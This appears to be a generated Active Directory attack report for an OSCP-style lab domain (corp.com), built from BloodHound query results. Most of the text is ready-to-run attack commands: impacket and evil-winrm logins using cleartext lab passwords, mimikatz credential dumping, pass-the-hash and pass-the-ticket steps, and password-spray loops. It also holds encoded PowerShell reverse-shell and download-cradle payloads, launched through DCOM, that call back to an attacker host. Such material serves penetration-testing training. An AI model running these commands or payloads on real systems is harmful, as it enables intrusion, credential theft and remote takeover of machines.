**OSCP Relevance:** HIGH | **Results:** None

### ✅ Password Age Distribution
**OSCP Relevance:** MEDIUM | **Results:** 9

> Find users with old passwords. Old passwords may be weak or appear in breach databases.

| User | PasswordLastSet | IsPrivileged | Description |
| --- | --- | --- | --- |
| STEPHANIE@CORP.COM | 3 years ago | False |  |
| JEFF@CORP.COM | 3 years ago | False |  |
| PETE@CORP.COM | 3 years ago | False |  |
| JEN@CORP.COM | 3 years ago | False |  |
| IIS_SERVICE@CORP.COM | 3 years ago | False |  |
| DAVE@CORP.COM | 3 years ago | False |  |
| JEFFADMIN@CORP.COM | 3 days ago | True |  |
| ADMINISTRATOR@CORP.COM | 3 days ago | True | Built-in account for administering the computer/domain |
| LEON@CORP.COM | 3 days ago | False |  |

### ✅ Inactive User Accounts
**OSCP Relevance:** MEDIUM | **Results:** 9

> Find enabled users who haven't logged in recently. May have default or forgotten passwords.

| User | LastLogon | Description |
| --- | --- | --- |
| PETE@CORP.COM | 2 years ago |  |
| IIS_SERVICE@CORP.COM | 2 years ago |  |
| STEPHANIE@CORP.COM | 2 years ago |  |
| JEFF@CORP.COM | 1 year ago |  |
| JEN@CORP.COM | 1 year ago |  |
| JEFFADMIN@CORP.COM | 1 year ago |  |
| ADMINISTRATOR@CORP.COM | 3 days ago | Built-in account for administering the computer/domain |
| LEON@CORP.COM | 3 days ago |  |
| DAVE@CORP.COM | 3 days ago |  |

### ✅ Enabled vs Disabled Account Ratio
**OSCP Relevance:** LOW | **Results:** 3

> Count enabled vs disabled accounts. High disabled count may indicate account churn.

| Enabled | Count |
| --- | --- |
|  | 2 |
| True | 9 |
| False | 2 |

### ⚪ Domain Trust Relationships
**OSCP Relevance:** MEDIUM | **Results:** None

### ✅ Relationship Count by Type
**OSCP Relevance:** LOW | **Results:** 35

> Count all relationship types in the database. Helps understand AD structure and attack surface.

| Relationship | Count |
| --- | --- |
| HAS_INDICATOR | 40814 |
| TAGGED | 15568 |
| HAS_FLAG | 6288 |
| ALTERNATIVE | 2253 |
| NEXT_STEP | 2199 |
| PREREQUISITE | 1070 |
| REFERENCES_COMMAND | 898 |
| HAS_STEP | 412 |
| GenericAll | 380 |
| EXECUTES | 348 |
| WriteOwner | 277 |
| WriteDacl | 277 |
| WriteOwnerRaw | 270 |
| GenericWrite | 215 |
| Owns | 183 |
| OwnsRaw | 178 |
| MemberOf | 108 |
| DEMONSTRATES | 106 |
| Contains | 92 |
| AddKeyCredentialLink | 56 |
| AllExtendedRights | 38 |
| TEACHES_SKILL | 30 |
| AdminTo | 28 |
| REQUIRES_SKILL | 18 |
| CanRDP | 8 |
| GetChangesAll | 6 |
| GetChanges | 6 |
| CoerceToTGT | 4 |
| GetChangesInFilteredSet | 4 |
| GPLink | 4 |
| FROM_PLATFORM | 4 |
| CanPSRemote | 2 |
| ExecuteDCOM | 2 |
| EXPLOITS_CVE | 2 |
| TEACHES_TECHNIQUE | 2 |

### ✅ High-Value Target Summary
**OSCP Relevance:** HIGH | **Results:** 9

> List all objects marked as high-value in BloodHound. Primary targets for attack planning.

| Target | Type | Description |
| --- | --- | --- |
| CORP.COM | ['Base', 'Domain', 'Tag_Tier_Zero'] |  |
| ACCOUNT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | Members can administer domain user and group accounts |
| ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | Administrators have complete and unrestricted access to the computer/domain |
| BACKUP OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | Backup Operators can override security restrictions for the sole purpose of backing up or restoring files |
| DOMAIN ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | Designated administrators of the domain |
| DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | All domain controllers in the domain |
| ENTERPRISE ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | Designated administrators of the enterprise |
| PRINT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | Members can administer printers installed on domain controllers |
| SERVER OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | Members can administer domain servers |

---

## Summary

| Metric | Count |
| ------ | ----- |
| Total Queries | 74 |
| With Results | 29 |
| No Results | 31 |
| Skipped | 14 |
| Failed | 0 |

### Key Findings

- **WriteDacl Abuse Paths**: 66 results (Privilege Escalation)
- **WriteOwner Abuse Paths**: 66 results (Privilege Escalation)
- **Owns Relationships on Users/Groups**: 27 results (Privilege Escalation)
- **GenericAll on High-Value Targets**: 26 results (Privilege Escalation)
- **High-Value Target Summary**: 9 results (Operational)
- **Full Attack Path: Owned User -> Pivot -> DA**: 7 results (Attack Chains)
- **Shortest Path to Domain Admins**: 7 results (Attack Chains)
- **Credential Harvest Opportunities**: 7 results (Attack Chains)
- **DCSync Rights**: 6 results (Privilege Escalation)
- **Non-DA Users with Local Admin on Workstations**: 5 results (Lateral Movement)
- **RDP Access Targets**: 4 results (Lateral Movement)
- **All Local Admins per Computer**: 2 results (Lateral Movement)
- **All Domain Admins**: 2 results (Privilege Escalation)
- **AS-REP Roastable Users**: 1 results (Quick Wins)
- **Kerberoastable Service Accounts**: 1 results (Quick Wins)
- **Unconstrained Delegation Systems**: 1 results (Quick Wins)
- **PSRemote Access (Evil-WinRM Targets)**: 1 results (Lateral Movement)
- **Coercion Targets (Unconstrained Delegation)**: 1 results (Lateral Movement)
- **AS-REP Targets from Owned Context**: 1 results (Owned Principal)


## 🎯 Pwned User Attack Paths

### IIS_SERVICE@CORP.COM
**Credential:** password

_No direct machine access via BloodHound edges_

### DAVE@CORP.COM
**Credential:** password

#### Local Admin Access (1 machines)

**CLIENT74.CORP.COM**

| Technique | Command |
|-----------|---------|
| psexec | `impacket-psexec 'corp.com/DAVE:Flowers1'@192.168.249.74` |
| wmiexec | `impacket-wmiexec 'corp.com/DAVE:Flowers1'@192.168.249.74` |
| smbexec | `impacket-smbexec 'corp.com/DAVE:Flowers1'@192.168.249.74` |
| dcomexec | `impacket-dcomexec -object MMC20 'corp.com/DAVE:Flowers1'@192.168.249.74` |
| evil-winrm | `evil-winrm -i 192.168.249.74 -u DAVE -p 'Flowers1'` |
| dcom | `$dcom=[System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','192.168.249.74')); $dcom.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c <COMMAND>','7')` |


**Technique Comparison**

| Technique | Noise | Ports | Advantages | Disadvantages |
|-----------|-------|-------|------------|---------------|
| psexec | HIGH | 445 | Reliable, gets SYSTEM shell, works with hash/ticket | Creates service, logged in Event Log, AV detection |
| wmiexec | MEDIUM | 135 | No service creation, runs as user, uses WMI (legitimate) | No SYSTEM shell, requires RPC, slower than PsExec |
| smbexec | HIGH | 445 | SYSTEM shell, creates fewer artifacts than PsExec | Service creation, Event Log entries, AV detection |
| dcomexec | MEDIUM | 135 | Uses DCOM (often overlooked), runs as user | Requires RPC, less reliable than PsExec/WMI |
| evil-winrm | LOW | 5985,5986 | Interactive PowerShell, file upload/download, stealthy, great for post-exploitation | Requires WinRM enabled, may need firewall exception |
| dcom | LOW | 135 | Fileless, native PowerShell, no tools needed, often bypasses detection | Requires compromised Windows host to run from, no interactive shell |

### LEON@CORP.COM
**Credential:** password

#### Local Admin Access (2 machines)

**CLIENT74.CORP.COM**

| Technique | Command |
|-----------|---------|
| psexec | `impacket-psexec 'corp.com/LEON:HomeTaping199!'@192.168.249.74` |
| wmiexec | `impacket-wmiexec 'corp.com/LEON:HomeTaping199!'@192.168.249.74` |
| smbexec | `impacket-smbexec 'corp.com/LEON:HomeTaping199!'@192.168.249.74` |
| dcomexec | `impacket-dcomexec -object MMC20 'corp.com/LEON:HomeTaping199!'@192.168.249.74` |
| evil-winrm | `evil-winrm -i 192.168.249.74 -u LEON -p 'HomeTaping199!'` |
| dcom | `$dcom=[System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','192.168.249.74')); $dcom.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c <COMMAND>','7')` |

**FILES04.CORP.COM**

| Technique | Command |
|-----------|---------|
| psexec | `impacket-psexec 'corp.com/LEON:HomeTaping199!'@192.168.249.73` |
| wmiexec | `impacket-wmiexec 'corp.com/LEON:HomeTaping199!'@192.168.249.73` |
| smbexec | `impacket-smbexec 'corp.com/LEON:HomeTaping199!'@192.168.249.73` |
| dcomexec | `impacket-dcomexec -object MMC20 'corp.com/LEON:HomeTaping199!'@192.168.249.73` |
| evil-winrm | `evil-winrm -i 192.168.249.73 -u LEON -p 'HomeTaping199!'` |
| dcom | `$dcom=[System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','192.168.249.73')); $dcom.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c <COMMAND>','7')` |


**Technique Comparison**

| Technique | Noise | Ports | Advantages | Disadvantages |
|-----------|-------|-------|------------|---------------|
| psexec | HIGH | 445 | Reliable, gets SYSTEM shell, works with hash/ticket | Creates service, logged in Event Log, AV detection |
| wmiexec | MEDIUM | 135 | No service creation, runs as user, uses WMI (legitimate) | No SYSTEM shell, requires RPC, slower than PsExec |
| smbexec | HIGH | 445 | SYSTEM shell, creates fewer artifacts than PsExec | Service creation, Event Log entries, AV detection |
| dcomexec | MEDIUM | 135 | Uses DCOM (often overlooked), runs as user | Requires RPC, less reliable than PsExec/WMI |
| evil-winrm | LOW | 5985,5986 | Interactive PowerShell, file upload/download, stealthy, great for post-exploitation | Requires WinRM enabled, may need firewall exception |
| dcom | LOW | 135 | Fileless, native PowerShell, no tools needed, often bypasses detection | Requires compromised Windows host to run from, no interactive shell |

#### Authenticated User Attacks (Any Domain User)

Replace placeholders with your credentials:

| Attack | Command Template |
|--------|------------------|
| AS-REP Roasting ⚡ | `impacket-GetNPUsers '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request` |
| Kerberoasting ⚡ | `impacket-GetUserSPNs '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request` |
| BloodHound Collection ⚡ | `bloodhound-python -c all -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <DC_IP>` |
| Domain User Enumeration | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --users` |
| Domain Admins Members | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M groupmembership -o GROUP='Domain Admins'` |
| Share Enumeration | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --shares` |
| Computer Enumeration | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --computers` |
| Password Policy | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --pass-pol` |
| Domain Trust Enumeration | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_trusts` |
| GPO Enumeration | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_gpo` |


## 🔓 Post-Exploitation Commands

### DAVE@CORP.COM
**Credential:** password = `Flowers1`

**Targets (1):** CLIENT74

#### Credential Harvest Order

| # | Command | Priority |
|---|---------|----------|
| 1 | `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"` | HIGH |
| 2 | `mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"` | HIGH |
| 3 | `mimikatz.exe "privilege::debug" "lsadump::sam" "exit"` | MEDIUM |
| 4 | `mimikatz.exe "privilege::debug" "lsadump::secrets" "exit"` | MEDIUM |
| 5 | `mimikatz.exe "privilege::debug" "lsadump::cache" "exit"` | LOW |

#### With Harvested NTLM Hash

```
mimikatz.exe "sekurlsa::pth /user:DAVE /domain:corp.com /ntlm:<HASH> /run:cmd.exe"
```
> ⚠️ Use HOSTNAME not IP after Overpass-the-Hash!

#### Pass-the-Ticket Workflow

**1. EXPORT TICKETS**
```
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```
- Creates .kirbi files in current directory
- Look for *krbtgt*.kirbi files (TGTs) - HIGHEST PRIORITY
- TGT format: [session]-2-0-*-user@krbtgt-DOMAIN.kirbi

**2. IDENTIFY VALUABLE TICKETS**
| Priority | Pattern | Description |
|----------|---------|-------------|
| HIGHEST | `*krbtgt*.kirbi` | TGT - Can request ANY service ticket |
| HIGH | `*cifs*.kirbi` | File share access to specific host |
| MEDIUM | `*ldap*.kirbi` | LDAP access (enumeration) |
| LOW | `*http*.kirbi` | Web service access |

**3a. IMPORT TICKET (Windows)**
```
# Import
mimikatz.exe "kerberos::ptt <ticket.kirbi>" "exit"
# Verify
klist
```

**3b. IMPORT TICKET (Kali)**
```bash
# Convert
impacket-ticketConverter <ticket.kirbi> ticket.ccache
# Set env
export KRB5CCNAME=$(pwd)/ticket.ccache
# Verify
klist
```

**4. USE THE TICKET**
> ⚠️ **MUST use HOSTNAME not IP address!**

**Windows:**
```cmd
dir \\CLIENT74.domain.com\C$
type \\CLIENT74.domain.com\C$\Users\Administrator\Desktop\proof.txt
PsExec.exe \\CLIENT74.domain.com cmd.exe
```

**Kali:**
```bash
impacket-smbclient -k -no-pass CLIENT74.domain.com
impacket-psexec -k -no-pass user@CLIENT74.domain.com
impacket-secretsdump -k -no-pass user@CLIENT74.domain.com
```

**5. VERIFY ACCESS CHANGES**

```bash
crackmapexec smb CLIENT74.corp.com -u <USER> -p '<PASS>' --shares
crackmapexec smb CLIENT74.corp.com -k --shares  # With Kerberos ticket
```

**6. TROUBLESHOOTING**

- **klist shows no tickets after import**
  - Fix: Re-export on target, check timestamp, verify path to .kirbi
- **Access denied with valid ticket**
  - Fix: Use FQDN hostname, check klist expiry, export fresh ticket
- **KDC_ERR_PREAUTH_REQUIRED**
  - Fix: Verify KRB5CCNAME path is absolute, domain matches ticket

#### DCOM Lateral Movement (Fileless) -> CLIENT74.CORP.COM

**0. START LISTENER**
```bash
rlwrap nc -lvnp 443
```

**1. INSTANTIATE DCOM OBJECT**
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','CLIENT74.CORP.COM'))
```

**2. EXECUTE SHELL**

**[A] PowerShell TCP**
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAwACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=','7')
```

**[B] Download Cradle**
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADUALgAyADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=','7')
```

**[C] Powercat**
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADUALgAyADAAMAAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACcAKQA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADEAOQAyAC4AMQA2ADgALgA0ADUALgAyADAAMAAgAC0AcAAgADQANAAzACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAA=','7')
```

**TROUBLESHOOTING**
- Access denied: Verify local admin, check port 135
- No shell: Check firewall, verify listener

### LEON@CORP.COM
**Credential:** password = `HomeTaping199!`

**Targets (2):** CLIENT74, FILES04

#### Credential Harvest Order

| # | Command | Priority |
|---|---------|----------|
| 1 | `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"` | HIGH |
| 2 | `mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"` | HIGH |
| 3 | `mimikatz.exe "privilege::debug" "lsadump::sam" "exit"` | MEDIUM |
| 4 | `mimikatz.exe "privilege::debug" "lsadump::secrets" "exit"` | MEDIUM |
| 5 | `mimikatz.exe "privilege::debug" "lsadump::cache" "exit"` | LOW |

#### With Harvested NTLM Hash

```
mimikatz.exe "sekurlsa::pth /user:LEON /domain:corp.com /ntlm:<HASH> /run:cmd.exe"
```
> ⚠️ Use HOSTNAME not IP after Overpass-the-Hash!

#### Pass-the-Ticket Workflow

**1. EXPORT TICKETS**
```
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```
- Creates .kirbi files in current directory
- Look for *krbtgt*.kirbi files (TGTs) - HIGHEST PRIORITY
- TGT format: [session]-2-0-*-user@krbtgt-DOMAIN.kirbi

**2. IDENTIFY VALUABLE TICKETS**
| Priority | Pattern | Description |
|----------|---------|-------------|
| HIGHEST | `*krbtgt*.kirbi` | TGT - Can request ANY service ticket |
| HIGH | `*cifs*.kirbi` | File share access to specific host |
| MEDIUM | `*ldap*.kirbi` | LDAP access (enumeration) |
| LOW | `*http*.kirbi` | Web service access |

**3a. IMPORT TICKET (Windows)**
```
# Import
mimikatz.exe "kerberos::ptt <ticket.kirbi>" "exit"
# Verify
klist
```

**3b. IMPORT TICKET (Kali)**
```bash
# Convert
impacket-ticketConverter <ticket.kirbi> ticket.ccache
# Set env
export KRB5CCNAME=$(pwd)/ticket.ccache
# Verify
klist
```

**4. USE THE TICKET**
> ⚠️ **MUST use HOSTNAME not IP address!**

**Windows:**
```cmd
dir \\CLIENT74.domain.com\C$
type \\CLIENT74.domain.com\C$\Users\Administrator\Desktop\proof.txt
PsExec.exe \\CLIENT74.domain.com cmd.exe
```

**Kali:**
```bash
impacket-smbclient -k -no-pass CLIENT74.domain.com
impacket-psexec -k -no-pass user@CLIENT74.domain.com
impacket-secretsdump -k -no-pass user@CLIENT74.domain.com
```

**5. VERIFY ACCESS CHANGES**

```bash
crackmapexec smb CLIENT74.corp.com -u <USER> -p '<PASS>' --shares
crackmapexec smb CLIENT74.corp.com -k --shares  # With Kerberos ticket
```

**6. TROUBLESHOOTING**

- **klist shows no tickets after import**
  - Fix: Re-export on target, check timestamp, verify path to .kirbi
- **Access denied with valid ticket**
  - Fix: Use FQDN hostname, check klist expiry, export fresh ticket
- **KDC_ERR_PREAUTH_REQUIRED**
  - Fix: Verify KRB5CCNAME path is absolute, domain matches ticket

#### DCOM Lateral Movement (Fileless) -> CLIENT74.CORP.COM

**0. START LISTENER**
```bash
rlwrap nc -lvnp 443
```

**1. INSTANTIATE DCOM OBJECT**
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','CLIENT74.CORP.COM'))
```

**2. EXECUTE SHELL**

**[A] PowerShell TCP**
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAwACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=','7')
```

**[B] Download Cradle**
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADUALgAyADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=','7')
```

**[C] Powercat**
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADUALgAyADAAMAAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACcAKQA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADEAOQAyAC4AMQA2ADgALgA0ADUALgAyADAAMAAgAC0AcAAgADQANAAzACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAA=','7')
```

**TROUBLESHOOTING**
- Access denied: Verify local admin, check port 135
- No shell: Check firewall, verify listener


# Tailored Spray Commands

Based on BloodHound access relationships.

## Summary

- **Users with access:** 7
- **Target machines:** 3
- **Access types:** AdminTo, CanPSRemote, CanRDP, ExecuteDCOM

## Local Admin (AdminTo)

7 users, 3 unique target groups

### Group 1: 2 user(s) → 3 target(s)

**Users:** `administrator, jeffadmin`

**Targets:**

- `CLIENT74.CORP.COM` (192.168.249.74)
- `DC1.CORP.COM` (192.168.249.70)
- `FILES04.CORP.COM` (192.168.249.73)

#### File-based commands

```bash
# Create user and target files
echo -e "administrator\njeffadmin" > users_g1.txt
echo -e "192.168.249.74\n192.168.249.70\n192.168.249.73" > targets_g1.txt
crackmapexec smb targets_g1.txt -u users_g1.txt -p '<PASSWORD>'
```

#### Inline bash loop

```bash
for user in administrator jeffadmin; do
  for target in 192.168.249.74 192.168.249.70 192.168.249.73; do
    crackmapexec smb $target -u $user -p '<PASSWORD>'
  done
done
```

**Alternative protocols:**

```bash
# WinRM (evil-winrm)
evil-winrm -i 192.168.249.74 -u administrator -p '<PASSWORD>'
```

```bash
# PSExec
impacket-psexec 'CORP/administrator:<PASSWORD>'@192.168.249.74
```

```bash
# WMIExec
impacket-wmiexec 'CORP/administrator:<PASSWORD>'@192.168.249.74
```

### Group 2: 2 user(s) → 2 target(s)

**Users:** `jen, leon`

**Targets:**

- `CLIENT74.CORP.COM` (192.168.249.74)
- `FILES04.CORP.COM` (192.168.249.73)

#### File-based commands

```bash
# Create user and target files
echo -e "jen\nleon" > users_g2.txt
echo -e "192.168.249.74\n192.168.249.73" > targets_g2.txt
crackmapexec smb targets_g2.txt -u users_g2.txt -p '<PASSWORD>'
```

#### Inline bash loop

```bash
for user in jen leon; do
  for target in 192.168.249.74 192.168.249.73; do
    crackmapexec smb $target -u $user -p '<PASSWORD>'
  done
done
```

**Alternative protocols:**

```bash
# WinRM (evil-winrm)
evil-winrm -i 192.168.249.74 -u jen -p '<PASSWORD>'
```

```bash
# PSExec
impacket-psexec 'CORP/jen:<PASSWORD>'@192.168.249.74
```

```bash
# WMIExec
impacket-wmiexec 'CORP/jen:<PASSWORD>'@192.168.249.74
```

### Group 3: 3 user(s) → 1 target(s)

**Users:** `dave, jeff, stephanie`

**Targets:**

- `CLIENT74.CORP.COM` (192.168.249.74)

#### File-based commands

```bash
# Create user and target files
echo -e "dave\njeff\nstephanie" > users_g3.txt
echo -e "192.168.249.74" > targets_g3.txt
crackmapexec smb targets_g3.txt -u users_g3.txt -p '<PASSWORD>'
```

#### Inline bash loop

```bash
for user in dave jeff stephanie; do
  for target in 192.168.249.74; do
    crackmapexec smb $target -u $user -p '<PASSWORD>'
  done
done
```

**Alternative protocols:**

```bash
# WinRM (evil-winrm)
evil-winrm -i 192.168.249.74 -u dave -p '<PASSWORD>'
```

```bash
# PSExec
impacket-psexec 'CORP/dave:<PASSWORD>'@192.168.249.74
```

```bash
# WMIExec
impacket-wmiexec 'CORP/dave:<PASSWORD>'@192.168.249.74
```

## RDP Access (CanRDP)

4 users, 1 unique target groups

### Group 1: 4 user(s) → 1 target(s)

**Users:** `jeff, jeffadmin, jen, leon`

**Targets:**

- `CLIENT74.CORP.COM` (192.168.249.74)

#### File-based commands

```bash
# Create user and target files
echo -e "jeff\njeffadmin\njen\nleon" > users_g1.txt
echo -e "192.168.249.74" > targets_g1.txt
xfreerdp /v:targets_g1.txt /u:users_g1.txt /p:'<PASSWORD>' /cert:ignore
```

#### Inline bash loop

```bash
for user in jeff jeffadmin jen leon; do
  for target in 192.168.249.74; do
    xfreerdp /v:$target /u:$user /p:'<PASSWORD>' /cert:ignore
  done
done
```

**Alternative protocols:**

```bash
# rdesktop
rdesktop -u jeff -p '<PASSWORD>' 192.168.249.74
```

## PS Remoting (CanPSRemote)

1 users, 1 unique target groups

### Group 1: 1 user(s) → 1 target(s)

**Users:** `jeffadmin`

**Targets:**

- `FILES04.CORP.COM` (192.168.249.73)

#### File-based commands

```bash
# Create user and target files
echo -e "jeffadmin" > users_g1.txt
echo -e "192.168.249.73" > targets_g1.txt
evil-winrm -i targets_g1.txt -u users_g1.txt -p '<PASSWORD>'
```

#### Inline bash loop

```bash
for user in jeffadmin; do
  for target in 192.168.249.73; do
    evil-winrm -i $target -u $user -p '<PASSWORD>'
  done
done
```

**Alternative protocols:**

```bash
# WinRM (CrackMapExec)
crackmapexec winrm 192.168.249.73 -u jeffadmin -p '<PASSWORD>'
```

